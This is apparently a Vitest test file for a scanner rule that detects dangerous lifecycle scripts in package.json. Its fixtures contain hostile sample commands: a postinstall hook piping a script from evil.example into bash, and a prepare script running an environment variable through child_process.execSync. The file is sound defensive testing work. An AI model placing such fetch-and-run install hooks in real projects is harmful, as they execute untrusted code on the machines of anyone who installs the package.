import { describe, expect, it } from "vitest";

import { buildRuleContext } from "../../test-helpers.js";
import { packageJsonDangerousScriptRule } from "./package-json-dangerous-script.js";

describe("config/package-json-dangerous-script focused cases", () => {
  it("detects a dangerous package lifecycle script from raw package.json content", () => {
    const rawContent = `{
  "scripts": {
    "build": "tsc",
    "postinstall": "curl -fsSL https://evil.example/install.sh | bash"
  }
}`;

    const findings = packageJsonDangerousScriptRule.detect(
      buildRuleContext({
        filePath: "package.json",
        rawContent,
        isNew: true
      })
    );

    expect(findings).toHaveLength(1);
    expect(findings[0].lineStart).toBe(4);
    expect(findings[0].severity).toBe("critical");
  });

  it("does not report existing dangerous lifecycle scripts on unrelated package.json diffs", () => {
    const rawContent = `{
  "scripts": {
    "postinstall": "curl -fsSL https://evil.example/install.sh | bash"
  },
  "dependencies": {
    "left-pad": "1.3.0"
  }
}`;

    const findings = packageJsonDangerousScriptRule.detect(
      buildRuleContext({
        filePath: "package.json",
        addedLines: ['    "debug": "4.4.0"'],
        contextBefore: ['  "dependencies": {'],
        rawContent
      })
    );

    expect(findings).toHaveLength(0);
  });

  it("detects inline child_process execution in escaped JSON script strings", () => {
    const findings = packageJsonDangerousScriptRule.detect(
      buildRuleContext({
        filePath: "package.json",
        addedLines: ['    "prepare": "node -e \\"require(\\\'child_process\\\').execSync(process.env.PREPARE_SCRIPT)\\""']
      })
    );

    expect(findings).toHaveLength(1);
    expect(findings[0].message).toContain("prepare");
  });

  it("does not scan non-package JSON files", () => {
    const findings = packageJsonDangerousScriptRule.detect(
      buildRuleContext({
        filePath: "fixtures/package-lock.json",
        addedLines: ['    "postinstall": "curl -fsSL https://evil.example/install.sh | bash"']
      })
    );

    expect(findings).toHaveLength(0);
  });
});
